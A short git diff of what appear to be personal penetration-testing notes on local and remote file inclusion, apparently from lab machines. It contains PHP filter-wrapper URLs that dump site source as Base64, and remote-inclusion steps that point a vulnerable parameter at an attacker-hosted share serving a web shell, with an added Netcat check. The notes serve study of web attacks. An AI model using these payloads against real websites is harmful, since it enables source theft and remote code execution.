@@ -33,7 +33,6 @@ These return the Base64 of the site, see [[Base64]] to decode.
 - `http://10.10.10.80/?op=php://filter/convert.base64-encode/resource=view`
 - `http://10.10.10.80/?op=php://filter/convert.base64-encode/resource=upload`
 - `http://10.10.10.80/?op=php://filter/convert.base64-encode/resource=index`
-
 ### Unzip File
 
 [[Web Shells#ZIP Wrapper LFI]]
@@ -80,6 +79,11 @@ To exploit RFI, an attacker needs to find a vulnerable parameter in the applicat
 1. Replace the parameter with the remote IP of your machine, e.g. `/blog/?lang=\\10.10.14.29\\test`
 2. Host a Python webserver
 3. Point the website at a [[Web Shells|Web Shell]] 
+
+## Guide
+
+1. Point the RFI at a [[Netcat]] to see the request made first
+	1. If a SMB request is made, see [[smb]]
 
 ## SMB and Responder
 
